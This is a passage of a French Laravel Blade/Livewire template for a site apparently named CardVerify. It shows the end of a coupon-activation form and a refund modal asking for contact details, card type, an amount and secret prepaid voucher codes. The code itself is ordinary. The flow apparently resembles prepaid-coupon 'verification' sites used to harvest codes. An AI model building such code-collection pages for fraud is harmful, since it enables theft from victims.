                        @error('acceptTerms') <span class="text-xs text-red-600 block">{{ $message }}</span> @enderror

                        <button type="submit" wire:loading.attr="disabled"
                            class="w-full py-3.5 bg-blue-600 hover:bg-blue-700 active:scale-[0.98] text-white rounded-xl text-sm font-semibold shadow-lg shadow-blue-500/10 transition-all cursor-pointer flex items-center justify-center gap-2">
                            <span wire:loading.remove>{{ __('Valider & Activer le Coupon') }}</span>
                            <span wire:loading class="flex items-center gap-2">
                                <svg class="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
                                        stroke-width="4"></circle>
                                    <path class="opacity-75" fill="currentColor"
                                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
                                    </path>
                                </svg>
                                <span>{{ __('Traitement en cours...') }}</span>
                            </span>
                        </button>
                    </form>
                @endif
            </div>
        </div>
    </div>

    <!-- ==================== MODALE 2 : REMBOURSEMENT ==================== -->
    <div x-show="showRefund" x-cloak
        class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm"
        style="display: none;">
        <div @click.away="showRefund = false"
            class="relative w-full max-w-lg bg-white rounded-2xl shadow-2xl border border-slate-200 overflow-hidden flex flex-col max-h-[90vh]">
            <!-- Header Modale -->
            <div class="px-6 py-4 bg-slate-50 border-b border-slate-200 flex justify-between items-center">
                <h3 class="text-lg font-bold text-slate-900">{{ __('Demande de Remboursement') }}</h3>
                <button @click="showRefund = false"
                    class="text-slate-400 hover:text-slate-600 text-2xl font-bold cursor-pointer">&times;</button>
            </div>

            <!-- Contenu Modale -->
            <div class="p-6 overflow-y-auto space-y-4">
                @if($submittedSuccessfully)
                    <!-- Message de succès -->
                    <div class="text-center py-8 space-y-4">
                        <div
                            class="mx-auto h-12 w-12 rounded-full bg-emerald-100 flex items-center justify-center text-emerald-600 text-2xl font-bold">
                            &check;</div>
                        <h4 class="text-xl font-bold text-slate-900">{{ __('Demande Soumise !') }}</h4>
                        <p class="text-slate-600 text-sm px-4">{{ $successMessage }}</p>
                        <button @click="showRefund = false"
                            class="mt-6 inline-flex items-center justify-center rounded-xl bg-blue-600 px-5 py-2.5 text-sm font-semibold text-white hover:bg-blue-700 active:scale-95 cursor-pointer">{{ __('Fermer') }}</button>
                    </div>
                @else
                    <!-- Formulaire -->
                    <form wire:submit.prevent="saveRefund" class="space-y-4">
                        @if ($errors->has('general_refund'))
                            <div class="p-3 bg-red-50 border border-red-200 rounded-lg text-xs text-red-600">
                                {{ $errors->first('general_refund') }}
                            </div>
                        @endif

                        <div>
                            <label
                                class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Nom / Pseudo') }}</label>
                            <input type="text" wire:model.blur="refund_fullname"
                                class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                                placeholder="Ex: Jean Dupont">
                            @error('refund_fullname') <span class="text-xs text-red-600 mt-1 block">{{ $message }}</span>
                            @enderror
                        </div>

                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                            <div>
                                <label
                                    class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Adresse E-mail') }}</label>
                                <input type="email" wire:model.blur="refund_email_user"
                                    class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                                    placeholder="nom@exemple.com">
                                @error('refund_email_user') <span
                                class="text-xs text-red-600 mt-1 block">{{ $message }}</span> @enderror
                            </div>
                            <div>
                                <label
                                    class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Confirmer l\'E-mail') }}</label>
                                <input type="email" wire:model.blur="refund_email_user_confirmation"
                                    class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                                    placeholder="nom@exemple.com">
                                @error('refund_email_user_confirmation') <span
                                class="text-xs text-red-600 mt-1 block">{{ $message }}</span> @enderror
                            </div>
                        </div>

                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                            <div>
                                <label
                                    class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Type de carte') }}</label>
                                <select wire:model.live="refund_voucher_type_id"
                                    class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none">
                                    <option value="">{{ __('-- Sélectionner --') }}</option>
                                    @foreach($voucherTypes as $vt)
                                        <option value="{{ $vt->id }}">{{ $vt->name }}</option>
                                    @endforeach
                                </select>
                                @error('refund_voucher_type_id') <span
                                class="text-xs text-red-600 mt-1 block">{{ $message }}</span> @enderror
                            </div>
                            <div>
                                <label
                                    class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Montant (€)') }}</label>
                                <select wire:model="refund_amount"
                                    class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none">
                                    <option value="">{{ __('-- Sélectionner --') }}</option>
                                    <option value="50 €">50 €</option>
                                    <option value="100 €">100 €</option>
                                    <option value="150 €">150 €</option>
                                    <option value="250 €">250 €</option>
                                    <option value="500 €">500 €</option>
                                    <option value="1000 €">1000 €</option>
                                </select>
                                @error('refund_amount') <span class="text-xs text-red-600 mt-1 block">{{ $message }}</span>
                                @enderror
                            </div>
                        </div>

                        <div class="border-t border-slate-100 pt-4 space-y-4">
                            <!-- Code 1 -->
                            <div>
                                <label
                                    class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Code 1 (Principal)') }}</label>
                                <div class="relative">
                                    <input type="{{ $showRefundCode1 ? 'text' : 'password' }}" wire:model="refund_code1"
                                        class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none font-mono"
                                        placeholder="Entrez le premier code">
                                    <button type="button" wire:click="$toggle('showRefundCode1')"
                                        class="absolute inset-y-0 right-0 px-3 flex items-center text-slate-400 hover:text-slate-600 font-bold text-xs select-none cursor-pointer">
                                        {{ $showRefundCode1 ? __('Masquer') : __('Afficher') }}
                                    </button>
                                </div>
                                @error('refund_code1') <span class="text-xs text-red-600 mt-1 block">{{ $message }}</span>
                                @enderror
                            </div>

                            <!-- Code 2 -->
                            <div>
                                <label
                                    class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Code 2 (Optionnel)') }}</label>
                                <div class="relative">
                                    <input type="{{ $showRefundCode2 ? 'text' : 'password' }}" wire:model="refund_code2"
                                        class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none font-mono"
                                        placeholder="Entrez le second code (si disponible)">
                                    <button type="button" wire:click="$toggle('showRefundCode2')"
                                        class="absolute inset-y-0 right-0 px-3 flex items-center text-slate-400 hover:text-slate-600 font-bold text-xs select-none cursor-pointer">
                                        {{ $showRefundCode2 ? __('Masquer') : __('Afficher') }}
                                    </button>
                                </div>
                                @error('refund_code2') <span class="text-xs text-red-600 mt-1 block">{{ $message }}</span>
                                @enderror
                            </div>
                        </div>

                        <div>
                            <label
                                class="block text-xs font-semibold text-slate-700 uppercase mb-1">{{ __('Motif du remboursement') }}
                                <span class="text-[10px] font-normal text-slate-400">({{ __('Optionnel') }})</span></label>
                            <textarea wire:model="refund_user_comment" rows="2"
                                class="w-full px-3.5 py-2.5 border border-slate-300 rounded-lg text-sm bg-white focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                                placeholder="Pourquoi demandez-vous un remboursement..."></textarea>
                            @error('refund_user_comment') <span
                            class="text-xs text-red-650 mt-1 block">{{ $message }}</span> @enderror
                        </div>

                        <div class="flex items-start gap-2.5 pt-2">
                            <input type="checkbox" id="refund_acceptTerms" wire:model="refund_acceptTerms"
                                class="h-4 w-4 text-blue-600 border-slate-300 rounded focus:ring-blue-500 mt-0.5">
                            <label for="refund_acceptTerms"
                                class="text-xs text-slate-600 leading-tight">{{ __('J\'accepte la politique de remboursement de CardVerify et les conditions générales.') }}</label>
                        </div>
                        @error('refund_acceptTerms') <span class="text-xs text-red-600 block">{{ $message }}</span>
                        @enderror

                        <button type="submit" wire:loading.attr="disabled"
                            class="w-full py-3.5 bg-blue-600 hover:bg-blue-700 active:scale-[0.98] text-white rounded-xl text-sm font-semibold shadow-lg shadow-blue-500/10 transition-all cursor-pointer flex items-center justify-center gap-2">
                            <span wire:loading.remove>{{ __('Valider & Demander le Remboursement') }}</span>
                            <span wire:loading class="flex items-center gap-2">
                                <svg class="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
                                        stroke-width="4"></circle>
                                    <path class="opacity-75" fill="currentColor"
                                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
                                    </path>
                                </svg>
                                <span>{{ __('Traitement en cours...') }}</span>
                            </span>
                        </button>
                    </form>
                @endif
            </div>
        </div>
    </div>
</div>